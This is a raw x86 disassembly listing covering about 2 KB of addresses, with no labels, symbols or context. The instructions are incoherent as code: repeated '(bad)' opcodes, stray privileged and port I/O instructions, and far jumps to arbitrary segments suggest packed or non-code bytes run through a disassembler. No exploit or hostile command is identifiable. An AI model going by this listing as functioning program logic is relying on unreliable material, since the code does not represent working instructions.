  417d51:	fcmovb st,st(6)
  417d53:	test   al,0xea
  417d55:	mov    esp,0xc46254a5
  417d5a:	je     0x417d52
  417d5c:	hlt    
  417d5d:	and    DWORD PTR [ecx-0x59],esp
  417d60:	call   0x12f3d1a6
  417d65:	push   eax
  417d66:	test   eax,0x68f64b4d
  417d6b:	loopne 0x417d63
  417d6d:	cmp    BYTE PTR [edi+ebx*1+0x371f47b5],ah
  417d74:	ss cld 
  417d76:	ins    DWORD PTR es:[edi],dx
  417d77:	xor    ah,BYTE PTR [ecx]
  417d79:	(bad)  
  417d7a:	xchg   ecx,eax
  417d7b:	dec    eax
  417d7c:	inc    ebx
  417d7d:	pop    ss
  417d7e:	fild   WORD PTR [edx+edx*8]
  417d81:	xchg   edx,eax
  417d82:	bound  ebx,QWORD PTR [ebx+eax*8-0x4d62e7ec]
  417d89:	xchg   ebx,eax
  417d8a:	retf   0xdbf9
  417d8d:	mov    dh,0x7
  417d8f:	push   edx
  417d90:	mov    dh,bh
  417d92:	xchg   edi,eax
  417d93:	inc    ebx
  417d94:	mov    dl,0xea
  417d96:	push   cs
  417d97:	ja     0x417d19
  417d99:	pop    edi
  417d9a:	dec    edi
  417d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d9c:	xor    ebx,esi
  417d9e:	mov    bl,0xf5
  417da0:	adc    ebp,eax
  417da2:	out    0x97,al
  417da4:	lods   al,BYTE PTR ds:[esi]
  417da5:	pushf  
  417da6:	mov    al,ds:0x3ce05ca4
  417dab:	dec    esi
  417dac:	add    cl,cl
  417dae:	xchg   esi,eax
  417daf:	pop    esp
  417db0:	push   0x7
  417db2:	jmp    0x3d5e:0x8291cd21
  417db9:	mov    ch,0xd
  417dbb:	pop    ss
  417dbc:	adc    DWORD PTR [ebp+0x59],ebp
  417dbf:	inc    ebp
  417dc0:	xor    ecx,esp
  417dc2:	sbb    BYTE PTR [ebp+0x715b73db],cl
  417dc8:	mov    ds:0x6b2d0d35,al
  417dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dce:	pushf  
  417dcf:	add    eax,0x739a0c22
  417dd4:	(bad)  
  417dd5:	jle    0x417e53
  417dd7:	lahf   
  417dd8:	mov    ebx,0x25b394e
  417ddd:	xor    eax,0x8c370c02
  417de2:	into   
  417de3:	jns    0x417d80
  417de5:	mov    eax,ds:0x6461fee4
  417dea:	mov    es,WORD PTR [edi]
  417dec:	mov    bl,dl
  417dee:	cli    
  417def:	dec    ebx
  417df0:	lahf   
  417df1:	xchg   edx,eax
  417df2:	adc    ebx,esi
  417df4:	cmp    al,0x89
  417df6:	cmovb  eax,DWORD PTR [eax-0x675b3943]
  417dfd:	dec    ecx
  417dfe:	sub    eax,0x43793eb
  417e03:	not    BYTE PTR [esi-0x51]
  417e06:	ret    
  417e07:	xchg   edi,eax
  417e08:	jb     0x417e38
  417e0a:	jo     0x417d9a
  417e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e0d:	dec    esi
  417e0e:	push   esi
  417e0f:	pop    esp
  417e10:	and    ah,0x5a
  417e13:	push   0xdd425937
  417e18:	xchg   edi,eax
  417e19:	and    dh,al
  417e1b:	xchg   edi,eax
  417e1c:	adc    edi,DWORD PTR [edi-0x21]
  417e1f:	cwde   
  417e20:	cmp    DWORD PTR [edx-0x59586420],eax
  417e26:	into   
  417e27:	cs leave 
  417e29:	xor    eax,0xe5387af2
  417e2e:	push   es
  417e2f:	sti    
  417e30:	into   
  417e31:	rcr    BYTE PTR [edx*2-0x10016507],1
  417e38:	pushf  
  417e39:	(bad)  
  417e3a:	fiadd  WORD PTR [ecx-0x48]
  417e3d:	cmp    bh,dh
  417e3f:	loope  0x417ebe
  417e41:	dec    edi
  417e42:	add    ebp,edi
  417e44:	lock adc al,0xd
  417e47:	or     ah,BYTE PTR [edi+0x55]
  417e4a:	popa   
  417e4b:	mov    al,ds:0x28555ccc
  417e50:	push   cs
  417e51:	sbb    eax,0x51d65aad
  417e56:	sub    DWORD PTR [ebp-0x3d],ebp
  417e59:	ins    BYTE PTR es:[edi],dx
  417e5a:	sub    DWORD PTR [edi],ecx
  417e5c:	out    dx,al
  417e5d:	inc    ecx
  417e5e:	xchg   edi,eax
  417e5f:	sub    al,0x6d
  417e61:	in     al,0x84
  417e63:	cmp    DWORD PTR ds:0x50cfc714,esp
  417e69:	pop    edx
  417e6a:	retf   
  417e6b:	jmp    0x2496:0xaaa1cf10
  417e72:	loop   0x417e69
  417e74:	jae    0x417ecf
  417e76:	jns    0x417ee0
  417e78:	js     0x417e92
  417e7a:	imul   ebx,DWORD PTR [ecx+0xc6ad02f],0x1f
  417e81:	cmp    eax,0xf6e9de55
  417e86:	xchg   ebp,eax
  417e87:	jns    0x417eb2
  417e89:	sub    eax,0x9f5219ae
  417e8e:	fist   DWORD PTR cs:[esi]
  417e91:	test   DWORD PTR [eax-0x671fa273],ebp
  417e97:	jne    0x417e97
  417e99:	fwait
  417e9a:	retf   0x1442
  417e9d:	mov    edx,0x1a9b5a74
  417ea2:	std    
  417ea3:	mov    WORD PTR [eax+0x33],gs
  417ea6:	pop    edi
  417ea7:	and    eax,0x59f1cf9a
  417eac:	call   0x13dc:0x332a6e86
  417eb3:	fsubr  DWORD PTR [esi]
  417eb5:	stc    
  417eb6:	je     0x417e54
  417eb8:	push   edx
  417eb9:	sub    eax,0x7f01eeb7
  417ebe:	jecxz  0x417e9b
  417ec0:	loopne 0x417e5b
  417ec2:	sub    eax,0x42f17af8
  417ec7:	test   BYTE PTR [edx-0x52],bh
  417eca:	test   DWORD PTR [edi-0x4a3c9d89],edi
  417ed0:	lods   ax,WORD PTR ds:[esi]
  417ed2:	pop    ds
  417ed3:	mov    edx,0x4e91f36f
  417ed8:	mov    eax,ds:0xd899c609
  417edd:	jge    0x417e8a
  417edf:	div    DWORD PTR [edx]
  417ee1:	aam    0x9c
  417ee3:	push   ecx
  417ee4:	xchg   ebx,eax
  417ee5:	inc    ebx
  417ee6:	pop    ecx
  417ee7:	das    
  417ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ee9:	aaa    
  417eea:	sbb    ebx,DWORD PTR ds:0x474c67b7
  417ef0:	lahf   
  417ef1:	leave  
  417ef2:	xchg   DWORD PTR [ebx],ebx
  417ef4:	xchg   ecx,eax
  417ef5:	sbb    DWORD PTR [esi+0x4081bfd8],0xffffffd4
  417efc:	shl    DWORD PTR [edi-0x57],1
  417eff:	jmp    0x417f20
  417f01:	mov    bh,dh
  417f03:	cdq    
  417f04:	outs   dx,DWORD PTR ds:[esi]
  417f05:	jge    0x417e9e
  417f07:	add    al,0xdf
  417f09:	mov    esi,0x6de207b8
  417f0e:	jmp    0x6988:0x7b976c8
  417f15:	(bad)  
  417f16:	jb     0x417ea7
  417f18:	fisub  DWORD PTR [eax+eax*2]
  417f1b:	pextrw edi,(bad),0xc5
  417f1d:	js     0x417f45
  417f1f:	adc    BYTE PTR [edx-0x37a52cd8],0x36
  417f26:	fidivr DWORD PTR [ebx-0x67]
  417f29:	inc    esi
  417f2a:	sbb    BYTE PTR [esi-0x762f0208],dl
  417f30:	add    DWORD PTR [ebx+0x34],esp
  417f33:	imul   edi,DWORD PTR [ecx-0xfe1729f],0x8bd9e546
  417f3d:	xchg   ecx,eax
  417f3e:	or     eax,0x7bd20ac2
  417f43:	jno    0x417f51
  417f45:	fwait
  417f46:	imul   eax,DWORD PTR [esi-0x6e1d18d0],0x3b552b40
  417f50:	fild   QWORD PTR [ecx]
  417f52:	sub    ch,al
  417f54:	xor    DWORD PTR [ebp-0x3aa43000],ecx
  417f5a:	dec    eax
  417f5b:	inc    edx
  417f5c:	test   al,0x77
  417f5e:	adc    BYTE PTR [ebx],dl
  417f60:	stc    
  417f61:	mov    edi,0xef011d34
  417f66:	mov    ebp,gs
  417f68:	js     0x417f0c
  417f6a:	mov    eax,0x84db1e42
  417f6f:	lods   al,BYTE PTR ds:[esi]
  417f70:	popa   
  417f71:	inc    esp
  417f72:	loop   0x417f73
  417f74:	ror    BYTE PTR [ebx-0x25],0xa8
  417f78:	ror    BYTE PTR [eax],1
  417f7a:	pushaw 
  417f7c:	dec    ecx
  417f7d:	or     DWORD PTR [edi+0x58],edx
  417f80:	dec    ecx
  417f81:	adc    ebx,DWORD PTR ds:0x88d21d33
  417f87:	dec    edx
  417f88:	xchg   esi,eax
  417f89:	arpl   WORD PTR [ecx],ax
  417f8b:	add    eax,0xb8ff4c5c
  417f90:	mov    edi,0xc644ab09
  417f95:	xchg   esi,eax
  417f96:	mov    ebx,0x4d3d0c54
  417f9b:	pop    edi
  417f9c:	test   DWORD PTR [eax],0x1ef58adc
  417fa2:	xchg   esi,eax
  417fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fa4:	or     DWORD PTR [esi+eiz*4],edx
  417fa7:	xchg   ebp,eax
  417fa8:	dec    esp
  417fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417faa:	bound  ebp,QWORD PTR [eax+0x2211a4ed]
  417fb0:	sbb    BYTE PTR [eax],ah
  417fb2:	sub    esp,DWORD PTR ds:0x191f6103
  417fb8:	jle    0x418005
  417fba:	imul   eax,DWORD PTR ds:0x861ea3d9,0x3e
  417fc1:	stc    
  417fc2:	stos   BYTE PTR es:[edi],al
  417fc3:	add    cl,BYTE PTR [eax]
  417fc5:	pop    edx
  417fc6:	push   ecx
  417fc7:	cmp    eax,0x28587f13
  417fcc:	jl     0x417fe7
  417fce:	neg    al
  417fd0:	fidivr WORD PTR [esi-0x28f7cefc]
  417fd6:	jl     0x418019
  417fd8:	cmp    DWORD PTR cs:[ebp+edx*8-0x33b7811a],eax
  417fe0:	and    dl,BYTE PTR [ecx]
  417fe2:	js     0x417fb4
  417fe4:	ret    0xdb41
  417fe7:	lock or al,0x10
  417fea:	or     eax,0x6d670f78
  417fef:	aas    
  417ff0:	jnp    0x417f86
  417ff2:	cmp    eax,edi
  417ff4:	std    
  417ff5:	xchg   edx,eax
  417ff6:	sbb    dh,BYTE PTR [ebx*8-0x15fcb10]
  417ffd:	leave  
  417ffe:	adc    al,0xaf
  418000:	or     BYTE PTR [eax-0x46],dl
  418003:	pop    es
  418004:	jnp    0x417ff7
  418006:	fsubp  st(5),st
  418008:	je     0x418022
  41800a:	jmp    0x533a:0xe6f552b
  418011:	ret    0xce38
  418014:	call   0x24d9:0x3c22db79
  41801b:	lea    esp,[ecx-0x2707e32b]
  418021:	sub    dl,BYTE PTR [esi+eiz*8+0x66167429]
  418028:	adc    DWORD PTR [ecx-0x2e],edx
  41802b:	xchg   ebx,eax
  41802c:	mov    WORD PTR [ebp-0x11c0bd0b],gs
  418032:	mov    cl,BYTE PTR [ecx]
  418034:	mov    ds:0x283cdf35,al
  418039:	stos   BYTE PTR es:[edi],al
  41803a:	mov    dh,0x1e
  41803c:	shl    DWORD PTR [edi+0x4e583182],1
  418042:	pop    esi
  418043:	mov    edx,0x5a9c7b3
  418048:	adc    BYTE PTR [eax+0x12],bl
  41804b:	sbb    al,0x72
  41804d:	dec    eax
  41804e:	jp     0x41806f
  418050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418051:	and    eax,0xc695bbc
  418056:	jmp    0xa27e41e8
  41805b:	xchg   DWORD PTR [eax],edi
  41805d:	ret    
  41805e:	mov    BYTE PTR [edi+eax*2-0x22b004bb],ch
  418065:	pushf  
  418066:	dec    si
  418068:	xchg   ecx,eax
  418069:	inc    eax
  41806a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41806b:	int    0x26
  41806d:	inc    edi
  41806e:	loopne 0x41808c
  418070:	stos   DWORD PTR es:[edi],eax
  418071:	pop    eax
  418072:	xchg   ebx,ecx
  418074:	and    eax,eax
  418076:	ror    eax,1
  418078:	inc    ebx
  418079:	and    BYTE PTR [ebx],dl
  41807b:	in     al,0x23
  41807d:	call   0x58bb:0xc50dcb15
  418084:	jle    0x418064
  418086:	lahf   
  418087:	leave  
  418088:	sar    DWORD PTR [eax+0x20],1
  41808b:	and    BYTE PTR [esi-0x28],dh
  41808e:	dec    ebx
  41808f:	iret   
  418090:	mov    ds:0x48bcfd7e,al
  418095:	cld    
  418096:	mov    edx,ecx
  418098:	pop    es
  418099:	pop    esp
  41809a:	and    eax,0xc6d2176c
  41809f:	jae    0x4180b7
  4180a1:	jno    0x4180e3
  4180a3:	fwait
  4180a4:	les    eax,FWORD PTR [ebp+0x1d11f61d]
  4180aa:	scas   al,BYTE PTR es:[edi]
  4180ab:	stos   DWORD PTR es:[edi],eax
  4180ac:	mov    ecx,0x8885fc0d
  4180b1:	cmp    bl,0xce
  4180b4:	fisub  DWORD PTR [esp+ebx*2]
  4180b7:	mov    dl,0x30
  4180b9:	pop    DWORD PTR [eiz*2+0x4c1d7a94]
  4180c0:	imul   esi,DWORD PTR [esi],0x57
  4180c3:	lods   al,BYTE PTR ds:[esi]
  4180c4:	loope  0x418046
  4180c6:	hlt    
  4180c7:	jno    0x41811b
  4180c9:	loop   0x41809c
  4180cb:	push   ecx
  4180cc:	je     0x418072
  4180ce:	fwait
  4180cf:	xor    DWORD PTR [ebp+0x72],0x3dbe83fe
  4180d6:	dec    ebp
  4180d7:	mov    ebx,0x3f0948ee
  4180dc:	and    al,0xc7
  4180de:	call   0xe6b7ddcb
  4180e3:	jg     0x41811c
  4180e5:	je     0x4180f9
  4180e7:	mov    BYTE PTR [ebp+esi*4-0x613d93a4],dl
  4180ee:	mov    ch,0x21
  4180f0:	outs   dx,DWORD PTR ds:[esi]
  4180f1:	xchg   esi,eax
  4180f2:	addr16 retf 0x519e
  4180f6:	gs add bh,ch
  4180f9:	push   ebx
  4180fa:	add    esi,ebx
  4180fc:	(bad)  
  4180fd:	jne    0x4180d1
  4180ff:	push   0x4c88aaac
  418104:	leave  
  418105:	push   esp
  418106:	push   esp
  418107:	rcr    DWORD PTR [eax],0x8e
  41810a:	in     al,dx
  41810b:	ins    DWORD PTR es:[edi],dx
  41810c:	cmp    dh,dl
  41810e:	jmp    0x6326:0xf2506436
  418115:	mov    bl,0x31
  418117:	scas   eax,DWORD PTR es:[edi]
  418118:	sahf   
  418119:	sbb    al,BYTE PTR ds:0xc9184b5d
  41811f:	repz imul eax,edi,0xb3ba8567
  418126:	(bad)  
  418127:	(bad)  
  418128:	sti    
  418129:	enter  0xd7e8,0x3f
  41812d:	fcomp  QWORD PTR [edx+0x23848e4d]
  418133:	add    BYTE PTR ds:[esi-0x1d],bh
  418137:	pop    ecx
  418138:	sub    al,0xe6
  41813a:	and    BYTE PTR [ebx+eiz*8],ah
  41813d:	sub    DWORD PTR [ebp-0x5c3079a0],0xffffffcc
  418144:	mov    ds:0x74bb6b08,eax
  418149:	mov    ebx,0x391cb8f1
  41814e:	jmp    0x469a082f
  418153:	fistp  DWORD PTR [ecx+0x45]
  418156:	test   al,0x62
  418158:	mov    bh,0x54
  41815a:	mov    WORD PTR [esi-0x11a36f95],gs
  418160:	shrd   DWORD PTR ss:[edi],esp,cl
  418164:	je     0x4180f1
  418166:	adc    esi,ecx
  418168:	mov    ah,0x60
  41816a:	out    0x75,eax
  41816c:	outs   dx,DWORD PTR ds:[esi]
  41816d:	or     DWORD PTR [esi],ecx
  41816f:	dec    ebx
  418170:	pop    es
  418171:	imul   edi,DWORD PTR [edi],0x32d3cc4a
  418177:	sub    DWORD PTR [ebx+0x4a44b1e0],edi
  41817d:	fidivr DWORD PTR [ebp+edi*2-0x75786220]
  418184:	lahf   
  418185:	or     eax,0x557e56f8
  41818a:	imul   esp,DWORD PTR [ebp+0x4c],0xc50711fb
  418191:	cdq    
  418192:	ss ins DWORD PTR es:[edi],dx
  418194:	and    al,0x47
  418196:	lahf   
  418197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418198:	jns    0x4181e3
  41819a:	cmp    BYTE PTR [ecx],dl
  41819c:	inc    edx
  41819e:	fistp  QWORD PTR [ebx]
  4181a0:	inc    ecx
  4181a1:	xchg   BYTE PTR [eax],bl
  4181a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181a4:	(bad)  
  4181a5:	popf   
  4181a6:	test   DWORD PTR [edx+0x26cd927d],ebx
  4181ac:	inc    esi
  4181ad:	cmp    eax,DWORD PTR gs:[ebx+ebp*8]
  4181b1:	lahf   
  4181b2:	xlat   BYTE PTR ds:[ebx]
  4181b3:	inc    eax
  4181b4:	(bad)  
  4181b5:	mov    esp,0x670e0bf0
  4181ba:	pop    ebp
  4181bb:	sbb    al,0xbf
  4181bd:	sub    al,0x1
  4181bf:	push   ds
  4181c0:	xchg   edx,eax
  4181c1:	aas    
  4181c2:	lock nop
  4181c4:	call   0xa436:0xf129ed1c
  4181cb:	xor    DWORD PTR [edi],0x6d
  4181ce:	scas   eax,DWORD PTR es:[edi]
  4181cf:	xchg   ebp,eax
  4181d0:	xlat   BYTE PTR ds:[ebx]
  4181d1:	jecxz  0x418191
  4181d3:	add    ebx,DWORD PTR [esi-0x299ae398]
  4181d9:	dec    ebx
  4181da:	jnp    0x41823e
  4181dc:	jle    0x418185
  4181de:	pop    ss
  4181df:	push   cs
  4181e0:	(bad)  
  4181e2:	jne    0x4181d0
  4181e4:	cli    
  4181e5:	pusha  
  4181e6:	sahf   
  4181e7:	stos   BYTE PTR es:[edi],al
  4181e8:	inc    ecx
  4181e9:	and    BYTE PTR [ebp+edi*1-0x179b751d],dh
  4181f0:	stc    
  4181f1:	mov    ecx,0xd65c13
  4181f6:	popf   
  4181f7:	mov    ebx,ebp
  4181f9:	je     0x41822c
  4181fb:	mov    edi,0x840825b6
  418200:	jl     0x41818c
  418202:	push   ebp
  418203:	lea    ebx,ds:0x9773c199
  418209:	sbb    eax,0x4cdf4ff7
  41820e:	daa    
  41820f:	mov    al,0xb
  418211:	test   eax,0x7fdd2aaf
  418216:	push   0x773b0ccb
  41821b:	fwait
  41821c:	push   0x56
  41821e:	outs   dx,BYTE PTR ds:[esi]
  41821f:	popa   
  418220:	add    DWORD PTR [eax-0x2a],esp
  418223:	outs   dx,DWORD PTR ds:[esi]
  418224:	mov    al,ds:0x7e9821ee
  418229:	loope  0x41822d
  41822b:	cld    
  41822c:	fpatan 
  41822e:	pop    ebx
  41822f:	push   esp
  418230:	(bad)  [ebp+0x7709acdd]
  418236:	stos   BYTE PTR es:[edi],al
  418237:	add    eax,0x370f385e
  41823c:	sub    al,0xbb
  41823e:	mov    gs,WORD PTR [eax]
  418240:	xor    cl,BYTE PTR [edx]
  418242:	inc    ebp
  418243:	out    0x4c,eax
  418245:	mov    eax,0xc2250f36
  41824a:	pop    esp
  41824b:	popa   
  41824c:	test   eax,0x6598a058
  418251:	mov    bl,0x77
  418253:	(bad)  
  418254:	cmp    esi,DWORD PTR [eax+0x64b49f7c]
  41825a:	fucom  st(3)
  41825c:	adc    al,0xb
  41825e:	sub    DWORD PTR [esi+ecx*2],esp
  418261:	add    bl,BYTE PTR [ebx+0x69]
  418264:	js     0x418291
  418266:	xlat   BYTE PTR ds:[ebx]
  418267:	lock into 
  418269:	fldenv [esi-0x39f61ef1]
  41826f:	sbb    cl,BYTE PTR [ebx+0x582ae4da]
  418275:	call   0xe3be:0xe351fc86
  41827c:	xchg   esi,eax
  41827d:	popf   
  41827e:	sahf   
  41827f:	fild   QWORD PTR [ebx+0x8]
  418282:	cmp    DWORD PTR [eax-0x38],0x3d3d8b85
  418289:	push   edi
  41828a:	push   0x9aecf98b
  41828f:	and    BYTE PTR [edi+0x46],0x66
  418293:	loope  0x41822f
  418295:	mov    dl,dl
  418297:	add    DWORD PTR [edi],esi
  418299:	pusha  
  41829a:	clc    
  41829b:	retf   
  41829c:	cmp    al,0xdb
  41829e:	xor    edx,0xd1698897
  4182a4:	sbb    ebx,0x98ecc1e4
  4182aa:	sti    
  4182ab:	arpl   WORD PTR [esi+0x5b],si
  4182ae:	out    0x9,al
  4182b0:	add    edx,DWORD PTR [edx+0x5a]
  4182b3:	jbe    0x418249
  4182b5:	int3   
  4182b6:	sahf   
  4182b7:	cmp    eax,0x638f92a7
  4182bc:	jnp    0x418246
  4182be:	hlt    
  4182bf:	fidiv  DWORD PTR [edx]
  4182c1:	fldenv [edi]
  4182c3:	push   es
  4182c4:	ret    
  4182c5:	push   ebp
  4182c6:	fild   DWORD PTR [ebx-0x126140e9]
  4182cc:	ret    
  4182cd:	add    BYTE PTR [ebx+0x6335202d],bl
  4182d3:	mov    edi,0xc6f48887
  4182d8:	xchg   bh,cl
  4182da:	sub    eax,0x273c5c94
  4182df:	and    DWORD PTR [edi+0x384153ed],eax
  4182e5:	repnz aam 0xfa
  4182e8:	scas   al,BYTE PTR es:[edi]
  4182e9:	dec    esp
  4182ea:	mov    ds:0x71cda657,eax
  4182ef:	stos   DWORD PTR es:[edi],eax
  4182f0:	push   eax
  4182f1:	out    0x5,eax
  4182f3:	pop    ebx
  4182f4:	xor    bh,BYTE PTR [esi]
  4182f6:	aad    0x16
  4182f8:	xchg   esp,eax
  4182f9:	mov    BYTE PTR [eax],0xfa
  4182fc:	aas    
  4182fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182fe:	jge    0x41830a
  418300:	mov    ch,0xbe
  418302:	and    esp,DWORD PTR [eax-0x2e]
  418305:	jbe    0x41835c
  418307:	sbb    BYTE PTR [edi],dh
  418309:	outs   dx,DWORD PTR ds:[esi]
  41830a:	(bad)  
  41830b:	dec    esi
  41830c:	mov    dh,BYTE PTR [esi+0x7f]
  41830f:	or     eax,0x4f7c3cc0
  418314:	neg    cl
  418316:	iret   
  418317:	adc    dl,al
  418319:	leave  
  41831a:	das    
  41831b:	xor    eax,0xf851275f
  418320:	push   edi
  418321:	cmc    
  418322:	pop    es
  418323:	jbe    0x418350
  418325:	jge    0x4182fd
  418327:	mov    ah,0xe8
  418329:	je     0x41834e
  41832b:	enter  0xac55,0x5
  41832f:	jae    0x418308
  418331:	enter  0x8d5c,0x3b
  418335:	outs   dx,BYTE PTR ds:[esi]
  418336:	pop    esi
  418337:	sahf   
  418338:	nop
  418339:	push   cs
  41833a:	xchg   esp,eax
  41833b:	jmp    0xa273:0xa86ec2e0
  418342:	sahf   
  418343:	pcmpgtb mm1,QWORD PTR [edx+0x4f]
  418347:	popa   
  418348:	fmul   DWORD PTR [edi-0x1f]
  41834b:	test   al,0xd0
  41834d:	or     DWORD PTR [esp+edi*8+0x2480ab35],ecx
  418354:	xor    BYTE PTR [edi+0x6],bh
  418357:	sbb    eax,0x43816476
  41835c:	pop    esp
  41835d:	cmp    DWORD PTR [edi+0x48],eax
  418360:	add    eax,0xdb7abf3c
  418365:	dec    edi
  418366:	in     eax,0xdd
  418368:	inc    ebp
  418369:	mov    dh,0x5f
  41836b:	inc    ebx
  41836c:	xchg   edx,eax
  41836d:	mov    al,ds:0x55b8f5c
  418372:	mov    eax,0x8b4b3114
  418377:	mov    ds:0x26a58911,al
  41837c:	jnp    0x418388
  41837e:	ins    DWORD PTR es:[edi],dx
  41837f:	fstp   DWORD PTR [esi]
  418381:	mov    ch,cl
  418383:	dec    edx
  418384:	xchg   esp,eax
  418385:	stos   BYTE PTR es:[edi],al
  418386:	out    0x70,al
  418388:	mov    ch,BYTE PTR [eax+0x4]
  41838b:	pop    ecx
  41838c:	retf   0x4165
  41838f:	push   edx
  418390:	clc    
  418391:	pop    eax
  418393:	add    BYTE PTR [ecx+eax*2+0x4e91ee4f],ah
  41839a:	adc    dl,BYTE PTR [eax-0x4b]
  41839d:	add    DWORD PTR [ebx],0x28
  4183a0:	fstp   DWORD PTR [eax]
  4183a2:	jbe    0x41841d
  4183a4:	ret    
  4183a5:	pop    esi
  4183a6:	(bad)  
  4183a7:	out    0xbc,eax
  4183a9:	loop   0x41832c
  4183ab:	cld    
  4183ac:	std    
  4183ad:	dec    esi
  4183ae:	rcl    BYTE PTR [edi+0x49],cl
  4183b1:	xor    eax,0xc4cd9cf
  4183b6:	retf   
  4183b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183b8:	sub    bl,BYTE PTR [ebx+0x23]
  4183bb:	in     al,0xa6
  4183bd:	imul   ebp,DWORD PTR [esi],0x2ab9dfb9
  4183c3:	jp     0x418371
  4183c5:	sbb    ebp,DWORD PTR [eax-0x6ac5c8d1]
  4183cb:	push   es
  4183cc:	lock popf 
  4183ce:	sbb    al,0x1f
  4183d0:	push   ebp
  4183d1:	mov    esi,edi
  4183d3:	dec    ebp
  4183d4:	ret    
  4183d5:	jle    0x418413
  4183d7:	(bad)  
  4183d8:	lock push es
  4183da:	dec    ebp
  4183db:	out    0x9b,al
  4183dd:	retf   
  4183de:	xchg   ebx,eax
  4183df:	cli    
  4183e0:	cmp    eax,0xfe4c1cf
  4183e5:	enter  0x3e08,0xca
  4183e9:	inc    ebp
  4183ea:	stos   DWORD PTR es:[edi],eax
  4183eb:	or     DWORD PTR [ecx-0xda89cc1],eax
  4183f1:	or     al,0x93
  4183f3:	jnp    0x4183a5
  4183f5:	inc    ecx
  4183f6:	xchg   ecx,eax
  4183f7:	cld    
  4183f8:	stos   BYTE PTR es:[edi],al
  4183f9:	jns    0x4183db
  4183fb:	push   cs
  4183fc:	stc    
  4183fd:	mov    bh,BYTE PTR ds:0x9a746bfc
  418403:	mov    bh,BYTE PTR [edi-0x1d]
  418406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418407:	int    0xf9
  418409:	adc    DWORD PTR [esi],0xfffffffb
  41840c:	aam    0x9f
  41840e:	inc    edi
  41840f:	mov    al,0x40
  418411:	in     eax,dx
  418412:	ins    DWORD PTR es:[edi],dx
  418413:	retf   0xf819
  418416:	jae    0x4183dd
  418418:	in     eax,0x72
  41841a:	mov    bh,0x94
  41841c:	jp     0x4183e8
  41841e:	std    
  41841f:	daa    
  418420:	scas   eax,DWORD PTR es:[edi]
  418421:	test   eax,0x65e65f77
  418426:	retf   0xcf2a
  418429:	or     BYTE PTR es:[edi+ecx*4+0xc],ch
  41842e:	or     ebp,0xade0a9b9
  418434:	scas   eax,DWORD PTR es:[edi]
  418435:	sub    bl,cl
  418437:	xchg   edi,eax
  418438:	scas   eax,DWORD PTR es:[edi]
  418439:	fisttp QWORD PTR [eax]
  41843b:	es jp  0x4183d0
  41843e:	mov    ds:0xb1a11b6f,eax
  418443:	imul   ecx,DWORD PTR [ecx-0x70],0x1
  418447:	jecxz  0x4184bd
  418449:	mov    ah,bl
  41844b:	mov    DWORD PTR [ecx-0x80],edi
  41844e:	or     bl,BYTE PTR [ecx]
  418450:	sub    eax,0xab3fc9f6
  418455:	sbb    esi,DWORD PTR [eax]
  418457:	sbb    cl,BYTE PTR [ebx-0x12]
  41845a:	scas   al,BYTE PTR es:[edi]
  41845b:	push   ebp
  41845c:	dec    eax
  41845d:	dec    BYTE PTR [edi]
  41845f:	cli    
  418460:	jnp    0x418468
  418462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418463:	cmp    bl,BYTE PTR [ebx]
  418465:	call   0x1d94070b
  41846a:	not    DWORD PTR [ecx+0x79]
  41846d:	out    dx,eax
  41846e:	add    DWORD PTR [edi+0x223c5a97],esp
  418474:	jmp    0x9a62:0xa43a3c24
  41847b:	scas   al,BYTE PTR es:[edi]
  41847c:	mov    DWORD PTR [eax-0x7733cf8],0xd2975887
  418486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418487:	dec    esp
  418488:	jle    0x41845a
  41848a:	sub    al,0xdb
  41848c:	fist   WORD PTR gs:[eax+0x13]
  418490:	and    eax,0x37df7247
  418495:	xor    DWORD PTR [edi+0x2],0x2f98afe0
  41849c:	stos   DWORD PTR es:[edi],eax
  41849d:	loop   0x418444
  41849f:	cmp    bh,BYTE PTR [ebx-0x5d02fc0d]
  4184a5:	test   DWORD PTR [edx-0x3c7fb5c9],edx
  4184ab:	inc    DWORD PTR [ebp+0x74e67a0b]
  4184b1:	dec    edx
  4184b2:	jmp    0x53f600df
  4184b7:	sti    
  4184b8:	xchg   BYTE PTR [eax],dl
  4184ba:	pop    edx
  4184bb:	repz repz imul ecx,DWORD PTR [ebp+0x119c4223],0x45
  4184c4:	arpl   WORD PTR [edx],ax
  4184c6:	test   cl,cl
  4184c8:	cmc    
  4184c9:	xchg   ebx,eax
  4184ca:	cmp    DWORD PTR [edi+0x55d90c7d],edx
  4184d0:	cld    
  4184d1:	jo     0x418526
  4184d3:	aaa    
  4184d4:	retf   0x348e
  4184d7:	mov    ah,0x64
  4184d9:	sub    bh,BYTE PTR [esi]
  4184db:	add    ah,dh
  4184dd:	into   
  4184de:	pcmpgtw mm5,QWORD PTR [ebp+0x65]
  4184e2:	fdiv   DWORD PTR [edx]
  4184e4:	sbb    al,BYTE PTR [esi+0x6e]
  4184e7:	in     eax,dx
  4184e8:	cmp    BYTE PTR [edx-0x29ab3d0d],dh
  4184ee:	(bad)  
  4184ef:	sar    DWORD PTR [ebx-0x73],cl
  4184f2:	xor    bl,BYTE PTR [ebp-0x154dcf99]
  4184f8:	add    BYTE PTR [eax+0x4c813fc3],dl
  4184fe:	sub    eax,ecx
  418500:	push   ebx
  418501:	xor    bh,dh
  418503:	icebp  
  418504:	cwde   
  418505:	push   ebp
  418506:	hlt    
  418507:	inc    esp
  418508:	scas   eax,DWORD PTR es:[edi]
  418509:	(bad)  
  41850b:	cmp    al,0xd3
  41850d:	cli    
  41850e:	enter  0x2f3e,0xbe
  418512:	cwde   
  418513:	fwait
  418514:	ds sbb ebx,esp
  418517:	xor    BYTE PTR [esi+0x240447f9],ch
  41851d:	loop   0x4184ad
  41851f:	pop    es
  418520:	stc    
  418521:	fwait
